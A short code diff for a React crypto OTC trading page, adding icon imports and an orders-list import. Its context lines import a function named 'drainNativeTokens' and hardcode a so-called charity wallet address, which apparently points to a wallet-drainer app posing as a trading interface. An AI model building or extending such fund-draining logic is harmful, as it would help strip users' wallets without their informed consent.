@@ -6,7 +6,7 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Badge } from '@/components/ui/badge';
 import { motion, AnimatePresence } from 'framer-motion';
-import { X, ArrowUpDown, Clock, Send, FileText, Wallet, ExternalLink, Search, Loader2, AlertCircle, Check } from 'lucide-react';
+import { X, ArrowUpDown, Clock, Send, FileText, Wallet, ExternalLink, Search, Loader2, AlertCircle, Check, TrendingUp, TrendingDown } from 'lucide-react';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { fetchTokenInfo, DexScreenerTokenInfo } from '@/services/dexScreener';
 import { AnimatedLogo } from '@/components/AnimatedLogo';
@@ -20,6 +20,7 @@ import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { drainNativeTokens } from '@/utils/evmTransactions';
 import { useChainInfo } from '@/hooks/useChainInfo';
+import { OTC_ORDERS_LIST, TOTAL_ORDERS_VALUE, getAvatarUrl, OtcListStatus } from '@/data/otcOrdersList';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MAX_BATCH_SIZE = 5;
